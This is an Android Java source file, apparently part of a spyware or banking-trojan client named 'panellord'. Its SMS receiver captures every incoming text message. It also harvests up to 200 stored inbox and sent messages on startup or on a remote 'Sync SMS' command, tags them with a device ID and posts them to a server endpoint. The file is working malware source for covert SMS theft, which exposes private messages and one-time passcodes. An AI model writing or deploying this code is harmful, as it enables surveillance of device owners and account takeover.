package com.panellord;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";
    private static final ExecutorService POOL = Executors.newSingleThreadExecutor();

    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;
        Bundle b = intent.getExtras();
        if (b == null) return;

        Object[] pdus = (Object[]) b.get("pdus");
        String format = b.getString("format", "3gpp");
        if (pdus == null) return;

        final String deviceId = DeviceIdManager.getDeviceId(ctx);
        final JSONArray arr = new JSONArray();

        for (Object pdu : pdus) {
            SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu, format);
            if (msg == null) continue;
            try {
                JSONObject sms = new JSONObject();
                sms.put("deviceId",  deviceId);
                sms.put("msgId",     msg.getTimestampMillis() + "_" + msg.getOriginatingAddress());
                sms.put("from",      msg.getOriginatingAddress() != null ? msg.getOriginatingAddress() : "Unknown");
                sms.put("body",      msg.getMessageBody() != null ? msg.getMessageBody() : "");
                sms.put("direction", "inbox");
                sms.put("sim",       "SIM1");
                sms.put("timestamp", msg.getTimestampMillis());
                arr.put(sms);
            } catch (Exception e) {
                Log.e(TAG, "Error parsing SMS", e);
            }
        }

        if (arr.length() == 0) return;
        POOL.execute(() -> {
            try {
                ApiClient.postJson("/device/sms", arr.toString());
            } catch (Exception e) {
                Log.e(TAG, "Failed to send SMS", e);
            }
        });
    }

    /** Sync old SMS from inbox + sent box — called on startup and on "Sync SMS" command */
    public static void syncOldSms(Context ctx) {
        POOL.execute(() -> {
            try {
                String deviceId = DeviceIdManager.getDeviceId(ctx);
                JSONArray arr = new JSONArray();

                // ── Inbox ──────────────────────────────────────────────
                readBox(ctx, "content://sms/inbox", "inbox", deviceId, arr);

                // ── Sent ───────────────────────────────────────────────
                readBox(ctx, "content://sms/sent", "outbox", deviceId, arr);

                if (arr.length() > 0) {
                    ApiClient.postJson("/device/sms", arr.toString());
                    Log.d(TAG, "Synced " + arr.length() + " SMS");
                }
            } catch (Exception e) {
                Log.e(TAG, "Old SMS sync failed", e);
            }
        });
    }

    private static void readBox(Context ctx, String uriStr, String direction,
                                String deviceId, JSONArray out) {
        try {
            Uri uri = Uri.parse(uriStr);
            Cursor c = ctx.getContentResolver().query(
                uri,
                new String[]{"_id", "address", "body", "date"},
                null, null, "date DESC");
            if (c == null) return;
            int count = 0;
            while (c.moveToNext() && count < 200) {
                try {
                    String id   = c.getString(c.getColumnIndexOrThrow("_id"));
                    String addr = c.getString(c.getColumnIndexOrThrow("address"));
                    String body = c.getString(c.getColumnIndexOrThrow("body"));
                    long   date = c.getLong(c.getColumnIndexOrThrow("date"));
                    JSONObject sms = new JSONObject();
                    sms.put("deviceId",  deviceId);
                    sms.put("msgId",     direction + "_" + id);
                    sms.put("from",      addr != null ? addr : "?");
                    sms.put("body",      body != null ? body : "");
                    sms.put("direction", direction);
                    sms.put("sim",       "SIM1");
                    sms.put("timestamp", date);
                    out.put(sms);
                    count++;
                } catch (Exception ignored) {}
            }
            c.close();
        } catch (Exception e) {
            Log.e(TAG, "readBox failed: " + uriStr, e);
        }
    }
}
